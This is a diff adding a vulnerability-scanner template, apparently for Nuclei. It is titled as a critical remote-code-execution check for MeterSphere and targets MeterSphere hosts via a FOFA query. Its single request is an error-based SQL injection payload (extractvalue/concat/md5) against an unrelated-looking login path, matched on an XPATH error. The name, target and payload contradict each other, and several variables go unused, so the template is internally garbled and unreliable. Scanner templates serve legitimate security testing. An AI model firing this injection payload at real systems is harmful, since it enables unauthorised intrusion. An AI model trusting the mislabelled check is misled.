@@ -1,0 +1,24 @@
+id: MeterSphere-customMethod-rce
+info:
+  name: MeterSphere-customMethod-rce
+  author: sb    
+  severity: critical
+  description: 
+  metadata:
+    fofa-query: app="FIT2CLOUD-MeterSphere"
+variables:
+  s1: '{{rand_base(5, "56789")}}'
+  str: '{{rand_base(4)}}'
+  rand: '{{rand_base(3)}}'
+  
+http:
+  - raw:
+    - |      
+      GET /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1))) HTTP/1.1
+    
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"XPATH syntax error")' 
